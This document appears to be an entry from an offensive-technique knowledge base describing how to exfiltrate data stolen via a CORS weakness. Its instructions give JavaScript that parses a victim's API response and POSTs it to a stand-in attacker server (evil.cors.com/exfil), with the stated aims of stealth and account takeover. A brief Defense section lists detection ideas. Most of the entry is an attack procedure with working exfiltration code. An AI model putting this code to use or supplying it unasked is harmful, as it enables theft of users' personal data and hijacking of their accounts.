---
tags:
  - exfiltration
  - data-leak
  - post-request
type: procedure
tools: []
tactics:
  - '[[Exfiltration]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
techniques:
  - '[[Exfiltration Over Unencrypted Non-C2 Protocol]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 4d9c8bc6-3caf-414c-8341-60610115dca5
created_at: '2025-12-14T17:33:12.328Z'
updated_at: '2025-12-14T17:33:12.328Z'
validated: true
mitre_tactics:
  - '[[Exfiltration]]'
mitre_techniques:
  - '[[Exfiltration Over Unencrypted Non-C2 Protocol]]'
---
# Exfiltrate-Stolen-Data-to-Attackers-Server

## Summary

This procedure parses the stolen API response in JavaScript and sends it via a POST request to the attacker's server, completing the data theft and enabling account takeover using the exfiltrated information.

## Description

After fetching, the script encodes the responseText and POSTs to a controlled endpoint like http://evil.cors.com. This uses withCredentials=true for consistency, though not necessary here. Prerequisites: Successful data fetch. Outcomes: Attacker receives user details for misuse, such as credential stuffing or token replay.

## Requirements

1. Attacker's server endpoint to receive POST data
2. Fetched response data available in JavaScript
3. No additional auth needed for exfil endpoint

## Defense

Defensive measures and detection strategies:

- Monitor outbound network traffic for unexpected POSTs from browsers
- Implement Data Loss Prevention (DLP) rules for sensitive patterns
- Use certificate pinning to prevent exfil to untrusted domains

## Objectives

1. Transfer stolen data outside victim context
2. Maintain stealth in exfiltration
3. Enable post-exploitation like account takeover

## Instructions

### Step 1: Parse Fetched Data

**Context**: Extract usable info from API response.

In the onreadystatechange handler:

```javascript
var data = JSON.parse(xhr.responseText);
var stolenInfo = 'email=' + data.email + '&bio=' + data.bio;
```

> Focus on key fields like email, tokens for takeover.

### Step 2: Send POST to Attacker Server

**Context**: Exfiltrate via cross-origin POST.

Execute:

```javascript
var exfilXHR = new XMLHttpRequest();
exfilXHR.open('POST', 'http://evil.cors.com/exfil', true);
exfilXHR.withCredentials = true;
exfilXHR.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
exfilXHR.send('data=' + encodeURIComponent(xhr.responseText));
```

> Server at evil.cors.com logs the incoming data.

### Step 3: Confirm Receipt

**Context**: Verify exfiltration success.

Attacker checks server logs for POST payload.

> Expected: Full responseText received, e.g., raw JSON with user data.

## MITRE ATT&CK Mapping

### Tactics

- [[Exfiltration]]

### Techniques

- [[Exfiltration Over Unencrypted Non-C2 Protocol]]

### Sub-Techniques

-

## Commands Used

-

## Tools Used

-

## Tags

- [[Exfiltration]]
- [[data-leak]]
- [[post-request]]
